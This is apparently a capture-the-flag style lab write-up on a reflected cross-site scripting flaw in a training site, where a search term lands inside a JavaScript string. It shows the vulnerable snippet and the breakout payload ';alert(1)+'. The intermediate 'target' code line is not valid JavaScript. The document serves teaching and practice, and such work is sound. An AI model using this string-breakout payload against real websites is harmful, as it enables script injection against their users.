# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

URL: https://0a44000704aa0f638425916f00730048.web-security-academy.net/

![](./Images/img1.png)

## Testing fields:

![](./Images/img2.png)

![](./Images/img3.png)

## Preparation:

![](./Images/img4.png)

We have to escape:

```js
var searchTerms = 'AAAAAAAAAAA';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

We need a payload that turns the query to:

```js
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent'searchTerms';alert(1)' ">');
```

## Exploitation:

Payload:
```
';alert(1)+'
```

![](./Images/img5.png)